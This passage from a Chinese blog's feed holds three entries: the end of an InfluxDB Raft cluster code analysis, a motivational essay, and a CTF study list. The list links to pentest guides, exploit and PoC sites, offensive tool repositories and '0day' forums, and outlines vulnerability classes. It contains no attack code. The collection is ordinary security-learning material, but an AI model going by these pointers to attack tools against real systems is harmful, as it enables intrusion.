class="string">"new bolt store: %s"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">r.raftStore = store</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create the snapshot store.</span></span><br><span class="line">    <span class="comment">// 创建文件快照存储</span></span><br><span class="line">snapshots, err := raft.NewFileSnapshotStore(r.path, raftSnapshotsRetained, os.Stderr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"file snapshot store: %s"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create raft log.</span></span><br><span class="line">    <span class="comment">// 新建raft</span></span><br><span class="line">ra, err := raft.NewRaft(config, (*storeFSM)(s), store, store, snapshots, r.peerStore, r.transport)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"new raft: %s"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">r.raft = ra</span><br><span class="line"></span><br><span class="line">r.wg.Add(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">go</span> r.logLeaderChanges()</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;influxdb集群代码分析&quot;&gt;&lt;a href=&quot;#influxdb集群代码分析&quot; class=&quot;headerlink&quot; title=&quot;influxdb集群代码分析&quot;&gt;&lt;/a&gt;influxdb集群代码分析&lt;/h2&gt;&lt;p&gt;本文主要分析下influxdb中cluste
      
    
    </summary>
    
    
      <category term="influxdb" scheme="http://www.yorzorzy.xyz/categories/influxdb/"/>
    
    
      <category term="influxdb" scheme="http://www.yorzorzy.xyz/tags/influxdb/"/>
    
  </entry>
  
  <entry>
    <title>发篇心灵鸡汤</title>
    <link href="http://www.yorzorzy.xyz/2020/02/16/%E5%BF%83%E7%81%B5%E9%B8%A1%E6%B1%A4/"/>
    <id>http://www.yorzorzy.xyz/2020/02/16/%E5%BF%83%E7%81%B5%E9%B8%A1%E6%B1%A4/</id>
    <published>2020-02-16T11:47:41.228Z</published>
    <updated>2020-02-16T11:46:12.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="发篇心灵鸡汤"><a href="#发篇心灵鸡汤" class="headerlink" title="发篇心灵鸡汤"></a>发篇心灵鸡汤</h2><p>想要有意义的人生，本身就是很累。成天无所事事，那和死了有什么区别？死亡才是永久的休息，那才是真正的一劳永逸。我们得像那热水里的青蛙，在水中折腾翻滚，保持对生命的热忱。这本是生命本该有的状态。</p><p>人生没有永远的伤痛，再深的痛，伤口总会痊愈。人生没有过不去的坎，你不可以坐在坎边等它消失，你只能想办法穿过它。人生，没有永远的爱情，没有结局的感情，总要结束;不能拥有的人，总会忘记。慢慢地，你不会再流泪;慢慢地，一切都过去了……适当的放弃，是人生优雅的转身。</p><p>人生需要一种平衡。这方面得到的多了，其他就会失去一些。没有十全十美的人生，也不会有万事如意的生活。谁也不可能把所有的好处都占尽，也不可能倒霉到一无所有。失去的时候，要看看自己得到的；成功的时候，也要想想自己付出的。成败也好，得失也罢，无非相对而言，只在于你如何看待。</p><p>人生就像马拉松，获胜的关键不在于瞬间的爆发，而在于途中的坚持。你纵有千百个理由放弃，也要给自己找一个坚持下去的理由。很多时候，成功就是多坚持一分钟，这一分钟不放弃，下一分钟就会有希望。只是我们不知道，这一分钟会在什么时候出现。再苦再累，只要坚持走下去,属于你的风景终会出现。</p><p>人生就像骑自行车，想保持平衡就得往前走。人生总是在苦恼中循环往复，挣扎不出；得不到的想得到，得到了又怕失去，总觉得别人得到的比自己得到的多。我们每个人都在挣扎中撰写自己的人生。</p><p>人生是一列单向行驶的火车，中途会有许多大大小小的站点停靠，但是永远不售返程车票。在这列火车上，有些事情可以做，有些事情必须做，有些事情可做可不做，有些事情坚决不能做，做与不做的选择，决定了人生的方向；做多做少的差别，决定了人生的高度；做好做坏的结果，决定了人生的质量。</p><p>人生如棋，黑与白的交错，生与死的交融；人生如棋，所以有了”闲敲棋子落花灯“的闲适，”长人只消一棋局“的洒脱；人生如棋，这是一种竞争，亦是一种调和，漫漫人生，变换不定，令人也难免举棋不定。棋势无定，棋局难料，以不变应万变，胸有成竹，等闲应对看春秋。</p><p>人生像一本厚重的书，扉页是我们的梦想，目录是我们的脚印，内容是我们的精彩，后记是我们的回望。有些书是没有主角的，因为我们忽视了自我;有些书是没有线索的，因为我们迷失了自我；有些书是没有内容的，因为我们埋没了自我。唯有把自己当成主角和主线，我们才能写出属于自己的东西。</p><p>人生是一列单向行驶的火车，中途会有许多大大小小的站点停靠，但是永远不售返程车票。在这列火车上，有些事情可以做，有些事情必须做，有些事情可做可不做，有些事情坚决不能做，做与不做的选择，决定了人生的方向；做多做少的差别，决定了人生的高度；做好做坏的结果，决定了人生的质量。</p><p>世界没有悲剧和喜剧之分，如果你能从悲剧中走出来，那就是喜剧，如果你沉缅于喜剧之中，那它就是悲剧。如果你只是等待，发生的事情只会是你变老了。人生的意义不在于拿一手好牌，而在于打好一手坏牌。</p><p>宠辱不惊来去无意，如此心宁静，优雅随之。只有阳光而无阴影，只有欢乐而无痛苦，那就不是人生。在人生的清醒的时刻，在哀痛和伤心的阴影之下，人们真实的自我最接近。人生就像一杯没有加糖的咖啡，喝起来是苦涩的，回味起来却有久久不会褪去的余香。</p><p>欣赏的心情是一种积极的世界观，是一种健康、阳光的心态，是真正的快乐之源。人拥有一颗欣赏之心，世间皆是亮丽的风景；用欣赏的眼睛看自己，才能内心愉悦、心底生花。万事万物，你仰视它就伟大，你欣赏它就可爱。学会欣赏，你便拥有快乐；懂得欣赏，你便懂得生活的真谛。拥有欣赏之心，才有幸福人生。</p><p>生命很短暂，别把那些重要的话憋着，会没有时间说的。安静，明白了一个人的时光，人生，总有太多期待一直失望，总有太多梦想一直落空，总有太多言语无人可诉。有些人，深深记住，未必不是幸福；坎坷路途，给身边一份温暖；风雨人生，给自己一个微笑。生活，就是把快乐装在心中，一路向前。</p><p>岁月里看的是书，读的却是世界；日子沏的是茶，尝的却是生活。生活就是理解，生活就是面对现实微笑。生活就是越过心灵的障碍，平静心性；生活就是越过障碍，注视将来；生活就是知道自己的价值，自己所能做到的与自己所应该做到的。不要用苛刻的眼神看生活，生活的本身就是百味杂陈，人生就是风雨兼程。</p><p>我们常常被一个”争“字所纷扰，争到最后，原本阔大渺远的尘世，只剩下一颗自私的心了。心胸开阔一些；得失看轻一些；为别人多考虑一些，哪怕只是少争一点，把看似要紧的东西淡然地放一放，你会发现，人心会一下子变宽，世界会一下子变大。不争，人生至境！</p><p>世界的大小，人生的苦乐，心绪的好坏，全取决于你所处的位置。在这个物欲横流的世界里提升一个位置看世界，给自己的思想提升高度，给自己的灵魂储蓄深度，给自己的知识积累厚度，给自己的心灵增加纯度，才能拥有快乐的生活，站在另一个高度俯视世界，学会在平淡的日子里，享受那一份宁静美丽的人生吧。</p><p>生命的历程中，圆满只是憧憬，只是我们内心的愿景。一些事，用心了，尽力了，纵然不是圆满，也是一种美好。一些情，在意了，努力了，即使不是完美，也是一种纯真。人生路上，虽有精彩，但更多的是平淡。人生的路要自己走，事要自己做，我们就是于平凡的生活中，演绎着我们的人生，无怨无悔，继续前行！</p><p>人生就是一次感恩之旅，为爱要感恩，为恨也要感恩；感恩朋友，也要感恩对手。爱让你温暖感动，恨令你警策自省；朋友加持你的信心，对手磨练你的坚韧。带着一颗感恩的心行世，你就懂得谦卑恻隐；用一颗感恩的心待人处事，你才有宏大的格局，广阔的胸襟。这个世界不欠你，而你却欠着整个世界。</p><p>你若懂得知足，就会感到幸福。幸福不是得到的多，而是计较的少。幸福不是拥有的多，而是抱怨的少。坚强，不是面对悲伤不流一滴泪，而是痛哭过后笑着生活。亲情、友情、爱情，不是得到就是学到。无论爱与被爱，只要懂得、舍得、值得，那便是无憾人生。人生最永恒的幸福是平凡，人生最永远的拥有是珍惜。</p><p>人生再多的幸运、再多的不幸，都是曾经，都是过去。一如窗外的雨，淋过，湿过，走了，远了感悟人生。曾经的美好留于心底，曾经的悲伤置于脑后，不恋不恨。过去终是过去，那人，那事，那情，任你留恋，都是云烟。学会忘记，懂得放弃，人生总是从告别中走向明天。</p><p>人生越成功越淡然。做人成功以心胸宽广为基础，做事成功以百事能忍为起点。心宽则不计较，能忍则不躁动，不计较，不躁动便是淡然。淡然不是麻木，而是内心的稳健。对于感情，知道聚散都是缘，缘尽即散，惋惜也无益。对于事业，了悟成败都是向前，成则继续，败则完善，不必大喜大悲。淡然，让人生超脱。</p><p>人生难得一心静。心静才能心安。心浮气躁之人，做人缺乏和善，做事缺乏耐心，势必会让人生陷入僵局。克制浮躁，唯有静心。静心，需要用理智去稀释狂乱的情感，用豁达去释放囚禁的过去，用坦然去迎接不可预知的未来。让心静下来，你才能读懂自己、看清未来。静心，是一种修炼也是一种修养。</p><p>纪念疫情，纪念远去的日子。谢谢。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;发篇心灵鸡汤&quot;&gt;&lt;a href=&quot;#发篇心灵鸡汤&quot; class=&quot;headerlink&quot; title=&quot;发篇心灵鸡汤&quot;&gt;&lt;/a&gt;发篇心灵鸡汤&lt;/h2&gt;&lt;p&gt;想要有意义的人生，本身就是很累。成天无所事事，那和死了有什么区别？死亡才是永久的休息，那才是真正的一劳永逸。
      
    
    </summary>
    
    
      <category term="心灵鸡汤" scheme="http://www.yorzorzy.xyz/categories/%E5%BF%83%E7%81%B5%E9%B8%A1%E6%B1%A4/"/>
    
    
      <category term="心灵鸡汤" scheme="http://www.yorzorzy.xyz/tags/%E5%BF%83%E7%81%B5%E9%B8%A1%E6%B1%A4/"/>
    
  </entry>
  
  <entry>
    <title>CTF 学习资料整理</title>
    <link href="http://www.yorzorzy.xyz/2020/02/13/ctf%E8%B5%84%E6%96%99%E6%95%B4%E7%90%86/"/>
    <id>http://www.yorzorzy.xyz/2020/02/13/ctf%E8%B5%84%E6%96%99%E6%95%B4%E7%90%86/</id>
    <published>2020-02-13T08:32:50.116Z</published>
    <updated>2020-02-13T08:30:21.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CTF-学习资料整理"><a href="#CTF-学习资料整理" class="headerlink" title="CTF 学习资料整理"></a>CTF 学习资料整理</h2><p>多个地方转载整理：</p><p>php代码解密<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fzhaoyuanma.com%2F" target="_blank" rel="noopener">https://zhaoyuanma.com/</a><br> Python <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fdocs.python.org%2Fzh-cn%2F3.7%2F" target="_blank" rel="noopener">https://docs.python.org/zh-cn/3.7/</a><br> 渗透师<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.shentoushi.top%2Fnetwork" target="_blank" rel="noopener">https://www.shentoushi.top/network</a><br> DVWA攻略<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.freebuf.com%2Farticles%2Fweb%2F119150.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/119150.html</a><br> WEB安全学习笔记<br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwebsec.readthedocs.io%2Fzh%2Flatest%2F" target="_blank" rel="noopener">https://websec.readthedocs.io/zh/latest/</a><br> 信息安全书籍<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.moondream.cn%2F%3Fp%3D851" target="_blank" rel="noopener">https://www.moondream.cn/?p=851</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FCHYbeta%2FWeb-Security-Learning%2Fblob%2Fmaster%2FREADME.md%23mongodb" target="_blank" rel="noopener">https://github.com/CHYbeta/Web-Security-Learning/blob/master/README.md#mongodb</a></p><p>高持续渗透<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fmicropoor.blogspot.com%2F" target="_blank" rel="noopener">https://micropoor.blogspot.com/</a><br> 安全攻防工具<br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.ms08067.com%2Ftool.html" target="_blank" rel="noopener">https://www.ms08067.com/tool.html</a><br> 0day银行<br> <a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.0daybank.org%2F%3Fpage_id%3D2" target="_blank" rel="noopener">http://www.0daybank.org/?page_id=2</a><br> 零日安全论坛<br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.jmpoep.com%2Fforum.php" target="_blank" rel="noopener">https://www.jmpoep.com/forum.php</a><br> CTF常用工具速查网<br> <a href="https://www.jianshu.com/p/ab24f22599a2" target="_blank" rel="noopener">https://www.jianshu.com/p/ab24f22599a2</a><br> 黑客街<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.hackjie.com%2F" target="_blank" rel="noopener">https://www.hackjie.com/</a><br> redteam <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.itcodemonkey.com%2Farticle%2F6375.html" target="_blank" rel="noopener">https://www.itcodemonkey.com/article/6375.html</a><br> Mac下<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fxclient.info" target="_blank" rel="noopener">https://xclient.info</a><br> <strong>WP</strong><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fctf.writeup.wiki%2F" target="_blank" rel="noopener">https://ctf.writeup.wiki/</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.ctfwp.com%2F" target="_blank" rel="noopener">https://www.ctfwp.com/</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fxz.aliyun.com%2Ft%2F4862" target="_blank" rel="noopener">https://xz.aliyun.com/t/4862</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fxz.aliyun.com%2Ft%2F4904" target="_blank" rel="noopener">https://xz.aliyun.com/t/4904</a></p><p><strong>PWN学习</strong><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fzoepla.github.io%2F2018%2F04%2Fpwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%2F" target="_blank" rel="noopener">https://zoepla.github.io/2018/04/pwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</a><br> <strong>逆向</strong><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fbbs.pediy.com%2Fthread-247176.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-247176.htm</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fblog.csdn.net%2Ftxwtech%2Farticle%2Fdetails%2F79189345" target="_blank" rel="noopener">https://blog.csdn.net/txwtech/article/details/79189345</a><br> <a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.dtdebug.com%2Fforum.php%3Fmod%3Dviewthread%26tid%3D3211%26mobile%3D2" target="_blank" rel="noopener">http://www.dtdebug.com/forum.php?mod=viewthread&amp;tid=3211&amp;mobile=2</a><br> <a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.pansoso.com%2Fg%2F899437%2F" target="_blank" rel="noopener">http://www.pansoso.com/g/899437/</a><br> <strong>渗透测试</strong><br> 渗透脑图<br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FAscotbe%2FOsmographic-brain-mapping" target="_blank" rel="noopener">https://github.com/Ascotbe/Osmographic-brain-mapping</a><br> 1）玄魂工作室–内部资源清单<br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fxuanhun%2FHackingResource" target="_blank" rel="noopener">https://github.com/xuanhun/HackingResource</a><br> 2）KaliLinuxWeb渗透测试手册(第二版)-6.7-利用XML外部实体注入<br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F6_sbkXFckb29bq08flhAOA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/6_sbkXFckb29bq08flhAOA</a><br> 3）渗透测试入门指南与路线规划<br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgitbook.cn%2Fgitchat%2Factivity%2F5c303ffe2a982d27f48994d9" target="_blank" rel="noopener">https://gitbook.cn/gitchat/activity/5c303ffe2a982d27f48994d9</a><br> 4）全新CTF，内网渗透，web安全教程上线<br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FukSra269UmRhXYxvsbshng" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/ukSra269UmRhXYxvsbshng</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fhanc00l%2Fwooyun_public" target="_blank" rel="noopener">https://github.com/hanc00l/wooyun_public</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Ffindneo.github.io%2F180308NewbieSecurityList" target="_blank" rel="noopener">https://findneo.github.io/180308NewbieSecurityList</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FDropsOfZut%2Fawesome-security-weixin-official-accounts" target="_blank" rel="noopener">https://github.com/DropsOfZut/awesome-security-weixin-official-accounts</a></p><p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Ffindneo%2FNewbie-Security-List" target="_blank" rel="noopener">https://github.com/findneo/Newbie-Security-List</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Feuphrat1ca%2Ffuzzdb-collect" target="_blank" rel="noopener">https://github.com/euphrat1ca/fuzzdb-collect</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fjaywcjlove%2Fhandbook" target="_blank" rel="noopener">https://github.com/jaywcjlove/handbook</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fjaywcjlove" target="_blank" rel="noopener">https://github.com/jaywcjlove</a><br> 内网渗透<br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fbbs.ichunqiu.com%2Fthread-48179-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-48179-1-1.html</a><br> k8工具<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fk8gege%2FK8tools" target="_blank" rel="noopener">https://github.com/k8gege/K8tools</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Ftruongkma%2Fctf-tools" target="_blank" rel="noopener">https://github.com/truongkma/ctf-tools</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FP1kachu%2Fv0lt" target="_blank" rel="noopener">https://github.com/P1kachu/v0lt</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fzardus%2Fctf-tools" target="_blank" rel="noopener">https://github.com/zardus/ctf-tools</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FTUCTF%2FTools" target="_blank" rel="noopener">https://github.com/TUCTF/Tools</a><br> <strong>ACM</strong><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fpan.baidu.com%2Fs%2F1vo-frs9RypuRFCX3WheNxw" target="_blank" rel="noopener">https://pan.baidu.com/s/1vo-frs9RypuRFCX3WheNxw</a>密码:ugcs<br> 一些工具<br> <strong>博客</strong><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fimpakho.com%2F" target="_blank" rel="noopener">https://impakho.com/</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fevoa.me%2F" target="_blank" rel="noopener">https://evoa.me/</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fbestwing.me%2F%23" target="_blank" rel="noopener">https://bestwing.me/#</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fcyto.top%2F" target="_blank" rel="noopener">https://cyto.top/</a><br> <a href="https://links.jianshu.com/go?to=http%3A%2F%2Fpupiles.com%2F" target="_blank" rel="noopener">http://pupiles.com/</a><br> <a href="https://links.jianshu.com/go?to=http%3A%2F%2Fsp4rk.cn%2Findex.php%2Fpage%2F1" target="_blank" rel="noopener">http://sp4rk.cn/index.php/page/1</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fskysec.top%2F" target="_blank" rel="noopener">https://skysec.top/</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.cjhsunny.xyz%2F" target="_blank" rel="noopener">https://www.cjhsunny.xyz/</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fveritas501.space%2F" target="_blank" rel="noopener">https://veritas501.space/</a><br> <a href="https://links.jianshu.com/go?to=http%3A%2F%2Fgv7.me%2F" target="_blank" rel="noopener">http://gv7.me/</a><br> <a href="https://links.jianshu.com/go?to=http%3A%2F%2Fmannix.top%2F" target="_blank" rel="noopener">http://mannix.top/</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.15qq.cn%2Fsort%2Fbug_poc" target="_blank" rel="noopener">https://www.15qq.cn/sort/bug_poc</a><br> <a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.vxia.net%2F" target="_blank" rel="noopener">http://www.vxia.net/</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.chinacycc.com%2Fforum.php%3Fmobile%3Dyes" target="_blank" rel="noopener">https://www.chinacycc.com/forum.php?mobile=yes</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgetpass.cn%2F" target="_blank" rel="noopener">https://getpass.cn/</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Flengjibo.github.io%2Fphp%E9%BB%91%E9%AD%94%E6%B3%95%2F" target="_blank" rel="noopener">https://lengjibo.github.io/php%E9%BB%91%E9%AD%94%E6%B3%95/</a><br> <a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.admintony.com%2F%E6%A0%A1%E5%9B%AD%E7%BD%91%E8%AE%A4%E8%AF%81%E7%B3%BB%E7%BB%9F-RG-SAM-Portal%E7%BB%84%E4%BB%B6-%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.html" target="_blank" rel="noopener">http://www.admintony.com/%E6%A0%A1%E5%9B%AD%E7%BD%91%E8%AE%A4%E8%AF%81%E7%B3%BB%E7%BB%9F-RG-SAM-Portal%E7%BB%84%E4%BB%B6-%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.html</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FNationalSecurityAgency" target="_blank" rel="noopener">https://github.com/NationalSecurityAgency</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FYadominJinta%2Fatilo%2Fblob%2Fmaster%2FCN%2FREADME_CN.md" target="_blank" rel="noopener">https://github.com/YadominJinta/atilo/blob/master/CN/README_CN.md</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fbbs.ichunqiu.com%2Fthread-49370-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-49370-1-1.html</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.certilience.fr%2F2019%2F03%2Ftomcat-exploit-variant-host-manager%2F-" target="_blank" rel="noopener">https://www.certilience.fr/2019/03/tomcat-exploit-variant-host-manager/-</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.freebuf.com%2Farticles%2Fweb%2F135342.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/135342.html</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.giantbranch.cn%2Farchives%2F" target="_blank" rel="noopener">https://www.giantbranch.cn/archives/</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fc1h2e1.github.io%2F%3Ftitle%3ARPO" target="_blank" rel="noopener">https://c1h2e1.github.io/?title:RPO</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fptriker.github.io%2F%3Fnsukey%3Di5ksp6ydekZ5gVkkzAillrRQbCM9m%2FEzuAESN0ysr648ghZbs%2FRX02k5ZurIP64Ms7%2B8bjHEc6KXxHVA4f18XdgBHyMczVFh1ACn9tR1haPSbPMbZubLg7pvyRdzNNucagm403QF2oasTKlZHlM6xWsATEITusqjpSTUXUDgdYxH9Tpm3RcXb6nvNyB%2B3K%2BuTpVWldTI8tgLH8xPtUbOOw%3D%3D" target="_blank" rel="noopener">https://ptriker.github.io/?nsukey=i5ksp6ydekZ5gVkkzAillrRQbCM9m%2FEzuAESN0ysr648ghZbs%2FRX02k5ZurIP64Ms7%2B8bjHEc6KXxHVA4f18XdgBHyMczVFh1ACn9tR1haPSbPMbZubLg7pvyRdzNNucagm403QF2oasTKlZHlM6xWsATEITusqjpSTUXUDgdYxH9Tpm3RcXb6nvNyB%2B3K%2BuTpVWldTI8tgLH8xPtUbOOw%3D%3D</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzI3MTY5NzI2Mw%3D%3D%26mid%3D2247484108%26idx%3D1%26sn%3D2eb978edf55dbb22e3cee6bc06817605%26chksm%3Deb3c96ccdc4b1fdac935e5394b7d1d422ae2fbf896fc46593667f96c0c2c1a63ec9a6cc1cb61%26xtrack%3D1%26scene%3D0%26subscene%3D131%26clicktime%3D1555484172%26ascene%3D7%26devicetype%3Dandroid-27%26version%3D2700033c%26nettype%3Dcmnet%26abtest_cookie%3DBAABAAoACwASABMABQAjlx4AVpkeAMWZHgDTmR4A3JkeAAAA%26lang%3Dzh_CN%26pass_ticket%3DaI%2B01Ha04R%2BVUYVe2%2FJK8c%2F8giqYlhSNP49ouTILhotOyjFzamhCHjg%2FmVq%2BLFoJ%26wx_header%3D1" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI3MTY5NzI2Mw==&amp;mid=2247484108&amp;idx=1&amp;sn=2eb978edf55dbb22e3cee6bc06817605&amp;chksm=eb3c96ccdc4b1fdac935e5394b7d1d422ae2fbf896fc46593667f96c0c2c1a63ec9a6cc1cb61&amp;xtrack=1&amp;scene=0&amp;subscene=131&amp;clicktime=1555484172&amp;ascene=7&amp;devicetype=android-27&amp;version=2700033c&amp;nettype=cmnet&amp;abtest_cookie=BAABAAoACwASABMABQAjlx4AVpkeAMWZHgDTmR4A3JkeAAAA&amp;lang=zh_CN&amp;pass_ticket=aI%2B01Ha04R%2BVUYVe2%2FJK8c%2F8giqYlhSNP49ouTILhotOyjFzamhCHjg%2FmVq%2BLFoJ&amp;wx_header=1</a><br> 域渗透<br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fstart.me%2Fp%2FX20Apn" target="_blank" rel="noopener">https://start.me/p/X20Apn</a><br> LiveOverflow-YouTube</p><p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.youtube.com%2Fchannel%2FUClcE-kVhqyiHCcjYwcpfj9w" target="_blank" rel="noopener">https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w</a><br> <a href="https://links.jianshu.com/go?to=http%3A%2F%2Fvipread.com%2Findex" target="_blank" rel="noopener">http://vipread.com/index</a>这里面有些信息收集的ppt�</p><p>POC编写指南<br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fpoc.evalbug.com%2Fchapter1%2F1.html" target="_blank" rel="noopener">https://poc.evalbug.com/chapter1/1.html</a><br> CTF入门指南<br> 新手的渗透学习流程：<br> 1、有哪些漏洞需要了解？<br> SQL注入、XSS、上传、csrf、xsrf、ssrf、crlf、xxe、url跳转、任意文件下载（读取）、弱口令、暴库、信息泄露、<br> 域传送、跨域（cors、jsonp、crossdomain）、反序列化、远程命令执行、拒绝服务、配置错误等等</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">逻辑：任意用户注册（登录、密码重置），支付漏洞，劫持，参数污染，条件竞争等等</span><br><span class="line">cms漏洞：phpcms，dedecms，discuz、drupal、wordpress、spring、struts2、jboss、weblogic、joomla、jenkins等等</span><br><span class="line">端口漏洞：elasticsearch、samba、redis、mongodb、zookeeper、memcache、hadoop、couchdb、ldap、rsync等等</span><br><span class="line">FUZZ字典（CRLF、jsonp、ua、url、xss、xxe、rce、dir、upload、sql、name、password）等等</span><br></pre></td></tr></table></figure><p>2、学习地址？<br> 各种漏洞                                        <a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwiki.chamd5.org%2F" target="_blank" rel="noopener">http://wiki.chamd5.org/</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FJnuSimba%2FMiscSecNotes" target="_blank" rel="noopener">https://github.com/JnuSimba/MiscSecNotes</a><br> web漏洞总结                                     <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FCHYbeta%2FWeb-Security-Learning" target="_blank" rel="noopener">https://github.com/CHYbeta/Web-Security-Learning</a><br> 乌云镜像<br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.madebug.net%2F" target="_blank" rel="noopener">https://www.madebug.net/</a>                                        <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwooyun.shuimugan.com%2F" target="_blank" rel="noopener">https://wooyun.shuimugan.com/</a><br> cms漏洞                                           <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FLucifer1993%2FAngelSword" target="_blank" rel="noopener">https://github.com/Lucifer1993/AngelSword</a><br> 国外漏洞                                        <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fpentester.land%2Flist-of-bug-bounty-writeups.html%23bug-bounty-writeups-published-in-2019" target="_blank" rel="noopener">https://pentester.land/list-of-bug-bounty-writeups.html#bug-bounty-writeups-published-in-2019</a><br> 更多学习地址尽在内部群</p><p>3、靶场<br> 